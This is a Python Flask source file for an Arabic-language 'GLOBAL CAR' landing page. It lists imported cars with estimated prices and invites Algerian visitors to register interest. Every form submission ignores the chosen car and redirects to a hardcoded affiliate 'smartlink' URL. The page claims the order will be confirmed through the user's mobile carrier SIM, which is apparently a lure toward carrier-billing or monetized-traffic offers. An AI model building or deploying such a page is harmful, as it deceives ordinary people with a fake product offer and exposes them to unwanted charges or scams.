"""
منصة GLOBAL CAR - التوجيه المباشر الذكي لجميع شبكات الجزائر

التشغيل المحلي:
    python app.py
"""
import os
from flask import Flask, redirect, render_template, request
from jinja2 import DictLoader

# ───────────────────────── الإعدادات ─────────────────────────
BRAND = os.environ.get("BRAND_NAME", "GLOBAL CAR")

# الرابط الذكي المباشر الجديد الشغال
PROMOTION_URL = os.environ.get(
    "PROMOTION_URL",
    "https://126d62c9b5d0.sunny-glow.net/?p=30075&media_type=mainstream"
)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "global_car_smartlink_secret_key")

# قائمة السيارات والمعلومات
CAR_GROUPS = [
    ("سيارات اقتصادية", [
        ("alto", "Maruti Alto", "ماروتي ألتو", 95),
        ("symbol", "Renault Symbol", "رينو سمبول", 130),
        ("logan", "Dacia Logan", "داسيا لوغان", 140),
        ("sandero", "Dacia Sandero", "داسيا سانديرو", 150),
        ("chery", "Chery QQ / Tiggo", "شيري", 120),
    ]),
    ("سيارات سياحية", [
        ("i10", "Hyundai i10", "هيونداي آي 10", 155),
        ("picanto", "Kia Picanto", "كيا بيكانتو", 160),
        ("clio4", "Renault Clio 4", "رينو كليو 4", 180),
        ("p301", "Peugeot 301", "بيجو 301", 175),
        ("tipo", "Fiat Tipo", "فيات تيبو", 190),
    ]),
]

@app.context_processor
def inject_globals():
    return dict(brand=BRAND)

# ───────────────────────── المسارات ─────────────────────────
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        # التوجيه التلقائي عبر الـ SmartLink الجديد
        return redirect(PROMOTION_URL)
    return render_template("index.html", groups=CAR_GROUPS)

# ───────────────────────── القوالب ─────────────────────────
BASE = """<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{% block title %}{{ brand }}{% endblock %}</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{--ink:#14232E;--paper:#F5F6F4;--card:#fff;--steel:#5B6B76;--line:#D9DEDB;
--accent:#0F6B63;--accent-d:#0A524C;--accent-bg:#E6F4F1}
*{box-sizing:border-box}
body{margin:0;font-family:"IBM Plex Sans Arabic",system-ui,sans-serif;background:var(--paper);
color:var(--ink);line-height:1.75;min-height:100vh;display:flex;flex-direction:column}
a{color:var(--accent)}
.wrap{max-width:1080px;margin:0 auto;padding:0 20px}
.top{background:var(--card);border-bottom:1px solid var(--line)}
.top .wrap{display:flex;justify-content:space-between;align-items:center;height:64px}
.brand{font-weight:700;font-size:1.1rem;color:var(--ink);text-decoration:none}
main{flex:1;padding:40px 0 56px}
.grid{display:grid;grid-template-columns:1fr 1.05fr;gap:48px;align-items:start}
h1{font-size:clamp(1.7rem,4vw,2.4rem);line-height:1.35;margin:0 0 14px;font-weight:700}
h2{font-size:1.25rem;margin:0 0 6px}
.lead{color:var(--steel);font-size:1.05rem;max-width:46ch;margin:0 0 28px}
.steps{list-style:none;margin:0 0 28px;padding:0;counter-reset:s}
.steps li{counter-increment:s;display:flex;gap:14px;margin-bottom:14px}
.steps li::before{content:counter(s);flex:none;width:30px;height:30px;border-radius:50%;
background:var(--accent);color:#fff;display:grid;place-items:center;font-weight:600;font-size:.9rem}
.steps b{display:block}.steps span{color:var(--steel);font-size:.92rem}
.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:28px}
fieldset{border:0;margin:0 0 20px;padding:0}
.group{font-size:.82rem;color:var(--steel);margin:14px 0 6px;font-weight:600}
.opts{display:grid;gap:8px}
.opt{position:relative;display:flex;justify-content:space-between;align-items:center;gap:12px;
padding:11px 14px;border:1px solid var(--line);border-radius:10px;cursor:pointer;background:#fff}
.opt input{position:absolute;opacity:0;inset:0;cursor:pointer}
.opt:has(input:checked){border-color:var(--accent);background:var(--accent-bg)}
.opt .n{font-weight:600}.opt .n small{display:block;font-weight:400;color:var(--steel)}
.opt .p{font-size:.88rem;color:var(--steel);white-space:nowrap}
.btn{width:100%;padding:13px 18px;border:0;border-radius:10px;background:var(--accent);color:#fff;
font:inherit;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;display:block}
.btn:hover{background:var(--accent-d)}
footer{border-top:1px solid var(--line);background:var(--card);padding:20px 0;color:var(--steel);font-size:.85rem}
@media(max-width:860px){.grid{grid-template-columns:1fr;gap:28px}.card{padding:20px}}
</style>
</head>
<body>
<header class="top"><div class="wrap"><a class="brand" href="/">{{ brand }}</a></div></header>
<main><div class="wrap">{% block main %}{% endblock %}</div></main>
<footer><div class="wrap">© {{ brand }}. الأسعار المعروضة تقديرية وقابلة للتغيّر.</div></footer>
</body></html>"""

INDEX = """{% extends "base.html" %}
{% block title %}سجّل اهتمامك بسيارة مستوردة · {{ brand }}{% endblock %}
{% block main %}
<div class="grid">
  <section>
    <h1>سجّل اهتمامك بسيارة مستوردة أقل من 3 سنوات</h1>
    <p class="lead">اختر السيارة التي تهمّك للمتابعة وتأكيد طلبك مباشرة عبر شريحة هاتفك.</p>

    <ol class="steps">
      <li><div><b>اختر السيارة</b><span>حدد السيارة المناسبة لك من القائمة.</span></div></li>
      <li><div><b>تأكيد الطلب</b><span>سيتم توجيهك لتأكيد الطلب عبر شبكة المتعامل الخاصة بك (جيزي، أوريدو، موبيليس).</span></div></li>
    </ol>
  </section>

  <section class="card">
    <h2>اختيار السيارة ومتابعة الطلب</h2>
    <form method="post" style="margin-top:20px">
      <fieldset>
        <legend style="font-weight:600;margin-bottom:10px">السيارات المتاحة والسعر التقديري</legend>
        {% for title, items in groups %}
          <div class="group">{{ title }}</div>
          <div class="opts">
          {% for key, en, ar, price in items %}
            <label class="opt">
              <input type="radio" name="car_key" value="{{ key }}" required>
              <span class="n">{{ ar }}<small dir="ltr" style="text-align:right">{{ en }}</small></span>
              <span class="p">≈ {{ price }} مليون سنتيم</span>
            </label>
          {% endfor %}
          </div>
        {% endfor %}
      </fieldset>

      <button class="btn" type="submit" style="margin-top:20px">متابعة وتأكيد الطلب</button>
    </form>
  </section>
</div>
{% endblock %}"""

app.jinja_loader = DictLoader({
    "base.html": BASE, "index.html": INDEX
})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
